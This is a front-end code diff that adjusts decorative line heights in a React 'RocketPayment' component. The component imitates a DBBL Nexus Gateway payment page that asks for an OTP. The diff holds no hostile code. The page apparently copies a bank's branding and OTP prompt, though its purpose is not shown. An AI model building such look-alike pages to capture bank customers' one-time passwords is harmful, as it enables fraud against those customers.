@@ -161,20 +161,19 @@ const RocketPayment = () => {
   // Blue lines with DBBL NEXUS GATEWAY text (blue text on white bg)
   const gatewayBanner = (
     <>
-      <img src={blueLine} alt="" className="w-full h-[3px] object-cover" />
       <div className="bg-white py-1 text-center">
         <span className="text-[#0000cc] text-sm min-[375px]:text-base font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
           DBBL NEXUS GATEWAY
         </span>
       </div>
-      <img src={blueLine} alt="" className="w-full h-[3px] object-cover" />
+      <img src={blueLine} alt="" className="w-full h-[5px] object-cover" />
     </>
   );
 
   // Footer with colored line
   const footer = (
     <div>
-      <img src={blueLine} alt="" className="w-full h-[3px] object-cover" />
+      <img src={blueLine} alt="" className="w-full h-[5px] object-cover" />
       <div className="text-center py-1 min-[375px]:py-1.5">
         <p className="text-[10px] min-[375px]:text-xs font-bold text-[#333]" style={{ fontFamily: 'Arial, sans-serif' }}>
           DBBL E-COMM With Service Hub Limited
@@ -199,7 +198,6 @@ const RocketPayment = () => {
     <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
-          <img src={blueLine} alt="" className="w-full h-[3px] object-cover" />
           <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
             <p className="text-[11px] min-[375px]:text-xs text-[#333] leading-relaxed mb-3" style={{ fontFamily: 'Arial, sans-serif' }}>
               An OTP (One Time Password) has been sent to your registered mobile and e-mail. Please input the OTP for verification.
